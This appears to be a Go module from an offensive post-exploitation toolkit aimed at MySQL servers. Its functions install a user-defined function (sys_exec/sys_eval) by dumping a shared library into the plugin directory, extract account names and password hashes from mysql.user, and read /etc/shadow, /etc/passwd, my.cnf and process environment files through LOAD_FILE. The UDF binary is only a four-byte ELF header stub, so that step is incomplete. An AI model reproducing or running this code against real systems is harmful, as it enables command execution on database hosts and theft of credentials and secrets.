package dbpost

import (
	"encoding/json"
	"fmt"
	"strings"
)

type MySQLExploit struct {
	config *DBPostConfig
	client *HTTPClient
}

func NewMySQLExploit(config *DBPostConfig, client *HTTPClient) *MySQLExploit {
	return &MySQLExploit{
		config: config,
		client: client,
	}
}

func (m *MySQLExploit) UDFInstall(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueUDFInstall

	steps := []struct {
		name  string
		query string
	}{
		{"check_plugin_dir", "SHOW VARIABLES LIKE 'plugin_dir'"},
		{"create_udf_table", "CREATE TABLE IF NOT EXISTS temp_udf (data LONGBLOB)"},
		{"insert_udf", "INSERT INTO temp_udf VALUES (0x7f454c46)"},
		{"write_udf", "SELECT data FROM temp_udf INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'"},
		{"create_function", "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so'"},
		{"create_eval", "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so'"},
	}

	var output strings.Builder
	for _, step := range steps {
		resp, err := m.executeQuery(creds, step.query)
		if err != nil {
			output.WriteString(fmt.Sprintf("[%s] Error: %v\n", step.name, err))
			continue
		}
		output.WriteString(fmt.Sprintf("[%s] OK: %s\n", step.name, resp))
	}

	if strings.Contains(output.String(), "OK") {
		result.Success = true
		result.CmdOutput = output.String()
		result.Data = map[string]interface{}{
			"method": "udf_install",
			"steps":  len(steps),
		}
		return result, nil
	}

	return result, fmt.Errorf("udf install failed")
}

func (m *MySQLExploit) UserExtract(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueUserExtract

	query := `SELECT user, host, plugin, authentication_string FROM mysql.user`
	resp, err := m.executeQuery(creds, query)
	if err != nil {
		return result, fmt.Errorf("query failed: %w", err)
	}

	var credsList []CredentialEntry
	lines := strings.Split(resp, "\n")
	for _, line := range lines {
		parts := strings.Fields(line)
		if len(parts) >= 2 {
			cred := CredentialEntry{
				Username: parts[0],
				Source:   "mysql_user_extract",
			}
			if len(parts) >= 2 {
				cred.Database = parts[1]
			}
			if len(parts) >= 4 {
				cred.Hash = parts[3]
			}
			credsList = append(credsList, cred)
		}
	}

	if len(credsList) > 0 {
		result.Success = true
		result.Credentials = credsList
		result.Data = map[string]interface{}{
			"method": "user_extraction",
			"count":  len(credsList),
		}
		return result, nil
	}

	return result, fmt.Errorf("user extraction failed")
}

func (m *MySQLExploit) FSAccess(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueFSAccess

	queries := []struct {
		name  string
		query string
	}{
		{"read_etc_passwd", "SELECT LOAD_FILE('/etc/passwd')"},
		{"read_shadow", "SELECT LOAD_FILE('/etc/shadow')"},
		{"read_my_cnf", "SELECT LOAD_FILE('/etc/my.cnf')"},
		{"read_proc_self", "SELECT LOAD_FILE('/proc/self/environ')"},
	}

	var output strings.Builder
	for _, q := range queries {
		resp, err := m.executeQuery(creds, q.query)
		if err != nil {
			output.WriteString(fmt.Sprintf("[%s] Error: %v\n", q.name, err))
			continue
		}
		if resp != "" && resp != "NULL" {
			output.WriteString(fmt.Sprintf("[%s] Content:\n%s\n\n", q.name, resp))
		}
	}

	if output.Len() > 0 {
		result.Success = true
		result.CmdOutput = output.String()
		result.Data = map[string]interface{}{
			"method": "filesystem_access",
		}
		return result, nil
	}

	return result, fmt.Errorf("filesystem access failed")
}

func (m *MySQLExploit) executeQuery(creds *DBCreds, query string) (string, error) {
	target := BuildURL(m.config.Target, "/query", 3306)

	payload := fmt.Sprintf("{\n\t\t\"query\": \"%s\",\n\t\t\"user\": \"%s\",\n\t\t\"password\": \"%s\",\n\t\t\"database\": \"%s\"\n\t}",
		strings.ReplaceAll(query, `"`, `\"`),
		creds.Username,
		creds.Password,
		creds.Database)

	body := strings.NewReader(payload)
	_, resp, err := m.client.Post(target, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return "", fmt.Errorf("execute query: %w", err)
	}

	var result map[string]interface{}
	if json.Unmarshal(resp, &result) == nil {
		if data, ok := result["data"].(string); ok {
			return data, nil
		}
		if error, ok := result["error"].(string); ok {
			return "", fmt.Errorf("mysql error: %s", error)
		}
	}

	return string(resp), nil
}
